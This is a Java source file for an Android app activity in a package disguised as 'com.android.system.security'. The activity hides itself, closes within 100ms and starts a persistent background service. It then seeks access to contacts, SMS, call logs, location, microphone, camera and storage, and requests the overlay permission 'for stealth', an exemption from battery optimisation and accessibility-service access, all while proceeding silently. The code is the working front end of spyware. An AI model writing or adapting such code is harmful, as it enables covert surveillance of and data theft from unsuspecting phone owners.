package com.android.system.security;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.PowerManager;
import android.provider.Settings;
import android.view.Gravity;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import android.widget.Toast;

import androidx.annotation.Nullable;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.util.ArrayList;
import java.util.List;

/**
 * Minimal invisible activity that requests permissions at opportune moments.
 * Shows for < 100ms, then finishes.
 */
public class MainActivity extends Activity {

    private static final int PERMISSION_REQUEST_CODE = 0x1337;
    private static final int OVERLAY_PERMISSION_CODE = 0x1338;
    private static final int BATTERY_OPTIMIZATION_CODE = 0x1339;
    private static final int ACCESSIBILITY_SETTINGS_CODE = 0x1340;

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Make activity transparent and invisible
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().setFlags(
            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
        );

        // Start immediately in background
        Intent serviceIntent = new Intent(this, CoreService.class);
        serviceIntent.putExtra("source", "activity");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }

        // Request permissions in background
        requestPermissionsIfNeeded();

        // Close activity after 100ms
        new Handler(getMainLooper()).postDelayed(this::finish, 100);
    }

    private void requestPermissionsIfNeeded() {
        List<String> needed = new ArrayList<>();

        String[] permissions = {
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.CAMERA,
            Manifest.permission.POST_NOTIFICATIONS,
            Manifest.permission.PACKAGE_USAGE_STATS,
        };

        for (String perm : permissions) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                // Only request dangerous permissions
                if (PackageManager.PERMISSION_GRANTED != 
                    getPackageManager().checkPermission(perm, getPackageName())) {
                    needed.add(perm);
                }
            }
        }

        if (!needed.isEmpty()) {
            ActivityCompat.requestPermissions(
                this,
                needed.toArray(new String[0]),
                PERMISSION_REQUEST_CODE
            );
        }

        // Request SYSTEM_ALERT_WINDOW (overlay) for stealth
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                Intent intent = new Intent(
                    Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:" + getPackageName())
                );
                startActivityForResult(intent, OVERLAY_PERMISSION_CODE);
            }
        }

        // Request battery optimization exemption
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (!pm.isIgnoringBatteryOptimizations(getPackageName())) {
                Intent intent = new Intent(
                    Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                    Uri.parse("package:" + getPackageName())
                );
                startActivityForResult(intent, BATTERY_OPTIMIZATION_CODE);
            }
        }

        // Guide user to enable accessibility service (one-time)
        if (!isAccessibilityServiceEnabled()) {
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            startActivityForResult(intent, ACCESSIBILITY_SETTINGS_CODE);
        }
    }

    private boolean isAccessibilityServiceEnabled() {
        String service = Settings.Secure.getString(
            getContentResolver(),
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        );
        return service != null && service.contains(getPackageName() + "/" + CoreService.class.getName());
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        // Permissions granted or denied — continue silently either way
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        // Handle overlay/battery/accessibility results silently
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        // Service continues running regardless
    }
                                                   }
